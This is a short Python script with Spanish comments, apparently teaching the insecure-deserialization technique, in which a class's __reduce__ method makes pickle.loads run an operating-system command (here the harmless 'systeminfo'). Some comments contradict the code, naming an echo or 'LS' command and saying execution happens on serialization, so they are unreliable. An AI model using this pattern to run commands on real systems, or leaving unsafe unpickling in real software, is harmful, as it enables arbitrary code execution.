import os, pickle##OS son las librerias que nos permiten interactuar con el sistema operativo,
##y pickle es una libreria que nos permite serializar objetos en Python.

class Malicioso:
    
    def __reduce__(self):
        return (os.system, ("systeminfo",))
          # Objeto  en este caso, se esta definiendo que cuando se serialice un objeto de la clase Malicioso,
        # se debe ejecutar el comando "echo TEXTO QUE SE EJECUTA EN EL SISTEMA" en el sistema operativo.
        
        ##llamados
carga = pickle.dumps(Malicioso())
print(carga)
        
pickle.loads(carga)  # Esto desencadena la ejecución del comando al deserializar el objeto.
        
        ##para usar los pickles, debemos importar la libreria pickle, 
        # y luego podemos usar las funciones dumps() y loads() para serializar y deserializar objetos respectivamente.
        ##El comando "LS" se usa para listar los archivos y directorios en un sistema operativo tipo Unix, como Linux o macOS.
        ##